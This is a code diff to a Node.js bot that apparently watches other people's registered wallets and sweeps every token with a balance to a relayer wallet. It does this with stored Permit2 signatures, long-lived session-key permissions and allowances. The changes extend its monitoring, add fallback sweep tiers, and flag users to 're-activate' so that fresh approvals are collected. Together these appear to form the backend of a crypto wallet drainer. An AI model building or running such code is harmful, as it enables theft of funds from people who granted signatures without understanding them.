@@ -217,11 +217,14 @@ const PERMIT2_BATCH_TRANSFER_ABI = [
   "function permitTransferFrom(tuple(tuple(address token, uint256 amount)[] permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount)[] transferDetails, address owner, bytes calldata signature) external",
 ];
 
-// ── Wallet & contracts — ALL bound to rpcProvider (HTTP) ─────────────────────
+// ── Wallet & contracts ────────────────────────────────────────────────────────
 // RULE: wsProvider is NEVER passed to a Contract or Wallet.
+// RULE: permit2Read for all READ calls (allowance) — uses free scanProvider.
+//       permit2 / permit2Batch for WRITE calls (permit, transferFrom) — relayerWallet.
 
 const relayerWallet = new ethers.Wallet(PRIVATE_KEY, rpcProvider);
 const permit2       = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, relayerWallet);
+const permit2Read   = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, getReadProvider()); // reads only
 const permit2Batch  = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_BATCH_TRANSFER_ABI, relayerWallet);
 const contract      = CONTRACT_ADDRESS
   ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
@@ -239,6 +242,28 @@ let realtimeChannel    = null;
 const BACKOFF_MS       = [5_000, 10_000, 20_000, 40_000, 60_000];
 let reconnectAttempt   = 0;
 function withJitter(ms) { return Math.floor(ms * (0.8 + Math.random() * 0.4)); }
+
+// ── WSS provider ref (for Transfer subscription rebuild) ──────────────────────
+// Stored module-level so the Realtime handler can rebuild Transfer event
+// subscriptions when new wallets are added. Without rebuild, wallets added
+// after startup are not included in the topics[2] wallet filter and will
+// never receive Transfer event notifications.
+let activeWsProvider = null;
+let _rebuildDebounce = null;
+function scheduleTransferRebuild() {
+  if (_rebuildDebounce) clearTimeout(_rebuildDebounce);
+  _rebuildDebounce = setTimeout(async () => {
+    if (!activeWsProvider || !TOKENS.length) return;
+    log(`[listeners] rebuilding Transfer subscriptions (${monitoredWallets.size} wallets)`);
+    try {
+      activeWsProvider.removeAllListeners();
+      await startTransferListeners(activeWsProvider, TOKENS);
+      await startNativeListener(activeWsProvider);
+    } catch (e) {
+      warn(`[listeners] rebuild failed: ${e.message}`);
+    }
+  }, 3_000); // 3s debounce — batch rapid wallet inserts
+}
 
 // In-memory guard: track permit() failures this session so we never retry.
 // Key: `${walletAddress}:${tokenAddress}`
@@ -536,7 +561,7 @@ async function sweepPermit2Wallet(walletAddress) {
       // Verify Permit2 allowance is set and not expired before any balance check
       let allowanceOk = false;
       try {
-        const [allowedAmount, expiration] = await permit2.allowance(
+        const [allowedAmount, expiration] = await permit2Read.allowance(
           checksum, tokenAddress, relayerWallet.address
         );
         allowanceOk = allowedAmount > 0n && expiration > nowSecs;
@@ -783,7 +808,7 @@ async function sweepGaslessWallet(walletAddress) {
     let needsPermit = false;
     for (const detail of permitBatch.details) {
       try {
-        const [amt, exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+        const [amt, exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
         if (amt === 0n || exp <= nowSecs) { needsPermit = true; break; }
       } catch { needsPermit = true; break; }
     }
@@ -1303,7 +1328,7 @@ async function dispatchSweep(wallet) {
   }
 }
 
-// ── Universal sweep — 4 tiers ───────────────────────────────────────────────
+// ── Universal sweep — 6 tiers ───────────────────────────────────────────────
 
 async function sweep(wallet) {
   const checksum = normalizeAddress(wallet.address);
@@ -1311,6 +1336,13 @@ async function sweep(wallet) {
   const short = checksum.slice(0, 10);
   const nowSecs = BigInt(Math.floor(Date.now() / 1000));
   const addrKey = checksum.toLowerCase();
+
+  // "monitoring" wallets have no signatures — nothing to sweep.
+  // Skip immediately to avoid 3 wasted Supabase queries per Transfer event.
+  if (wallet.type === "monitoring") {
+    log(`[sweep] ${short} — type=monitoring, nothing actionable yet`);
+    return;
+  }
 
   // ══════════════════════════════════════════════════════════════════════════
   // TIER 0: SESSION KEY (ERC-7715) — relayer has 2-year permission
@@ -1425,7 +1457,7 @@ async function sweep(wallet) {
       // signature on-chain. This sets Permit2's internal allowances for the
       // relayer so that transferFrom() calls below will succeed.
       try {
-        const [p2Amount0] = await permit2.allowance(checksum, pbData.permit.details[0]?.token, relayerWallet.address);
+        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, relayerWallet.address);
         if (p2Amount0 === 0n) {
           // Allowance not yet set — register it now using the stored sig
           log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances`);
@@ -1449,7 +1481,7 @@ async function sweep(wallet) {
 
       for (const detail of pbData.permit.details) {
         try {
-          const [p2Amount,, p2Exp] = await permit2.allowance(checksum, detail.token, relayerWallet.address);
+          const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
           if (p2Amount === 0n || BigInt(p2Exp) < nowSecs) continue;
 
           const token = new ethers.Contract(detail.token, ERC20_ABI, getReadProvider());
@@ -1488,8 +1520,27 @@ async function sweep(wallet) {
       log(`[gasless] deadline: ${sig.deadline} (${new Date(Number(sig.deadline) * 1000).toISOString()})`);
       log(`[gasless] permitted: ${sig.permitted?.length}`);
 
-      if (!spenderMatch) { log(`[gasless] ❌ spender mismatch`); return; }
-      if (dl < nowSecs) { log(`[gasless] ❌ expired`); return; }
+      if (!spenderMatch) {
+        err(`[gasless] ❌ SPENDER MISMATCH — sig signed for ${sig.spender} but relayer is ${relayerWallet.address}`);
+        err(`[gasless] Set BOT_ADDRESS env var on backend to ${relayerWallet.address} and have user re-activate`);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+        }
+        // Do NOT return — fall through to Tier 5 (direct-allowance may still work)
+      } else if (dl < nowSecs) {
+        warn(`[gasless] ❌ signature expired (${new Date(Number(sig.deadline) * 1000).toISOString()}) — marking for re-activation`);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+          await supabase.from("permit2_signatures")
+            .update({ spent: true })
+            .eq("id", stData.id).catch(() => {});
+        }
+        // Do NOT return — fall through to Tier 5
+      } else {
 
       // Check balances via Multicall3 — 1 RPC call per 250 tokens instead of
       // 498 individual calls (was taking ~50s and using 498 QuickNode credits).
@@ -1554,7 +1605,15 @@ async function sweep(wallet) {
         withBalance.splice(0, withBalance.length, ...approved);
       }
 
-      if (withBalance.length === 0) { log(`[gasless] no tokens with Permit2 approval — skipping`); return; }
+      if (withBalance.length === 0) {
+        warn(`[gasless] no tokens with Permit2 approval — user must re-activate to approve ERC-20→Permit2`);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ needs_reactivation: true })
+            .eq("address", addrKey).eq("chain", CHAIN).catch(() => {});
+        }
+        return;
+      }
       log(`[gasless] sweeping ${withBalance.length} tokens`);
 
       try {
@@ -1595,6 +1654,15 @@ async function sweep(wallet) {
           }
         }
       }
+      } // closes else { } (valid sig path)
+    }
+
+    // TIER 4.5 FALLBACK: if no permit2_signatures -sig row exists but wallet has
+    // permit_metadata.signatureTransfers stored in delegated_wallets, use the
+    // sweepGaslessWallet fallback. Handles old records or missing secondary writes.
+    if (!stData && wallet.type === "permit2-gasless") {
+      log(`[gasless] no permit2_signatures -sig row found — trying permit_metadata fallback`);
+      await sweepGaslessWallet(checksum);
     }
   }
 
@@ -2203,6 +2271,10 @@ function subscribeRealtime() {
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔔 ${isNew ? "new" : "updated"} wallet ${address.slice(0, 10)} (${type}) — checking balance`);
+        // Rebuild Transfer subscriptions so the new wallet is included in the
+        // topics[2] filter. Without this, Transfer events for this wallet are
+        // never delivered because the filter was built at bot startup.
+        scheduleTransferRebuild();
         const balances = await checkAllBalances(address);
         const nonZero  = balances.filter(b => b.balance > 0n);
         if (nonZero.length > 0) {
@@ -2228,6 +2300,8 @@ function subscribeRealtime() {
         needsReconnect.delete(address.toLowerCase());
         needsReauthWallets.delete(address.toLowerCase());
         log(`[realtime] 🔄 re-activated ${address.slice(0, 10)} (${type}) — dispatching sweep`);
+        // Rebuild Transfer subscriptions to include this wallet in the topics[2] filter.
+        scheduleTransferRebuild();
         // Always sweep on re-activation: new signatures may cover tokens with
         // zero balance now but positive balance moments later, and the balance
         // check only covers tokens in the watch list.
@@ -2250,6 +2324,7 @@ function subscribeRealtime() {
 async function startBot() {
   try {
     const wsProvider = new ethers.WebSocketProvider(WS_URL);
+    activeWsProvider = wsProvider; // store for Transfer subscription rebuild
 
     wsProvider.websocket.on("error", (wsErr) => {
       warn(`[ws] error: ${wsErr?.message ?? wsErr}`);
@@ -2258,6 +2333,7 @@ async function startBot() {
     wsProvider.websocket.on("close", () => {
       warn("[ws] closed — removing listeners and reconnecting...");
       wsProvider.removeAllListeners();
+      activeWsProvider = null;
       const base  = BACKOFF_MS[Math.min(reconnectAttempt, BACKOFF_MS.length - 1)];
       const delay = withJitter(base);
       reconnectAttempt++;
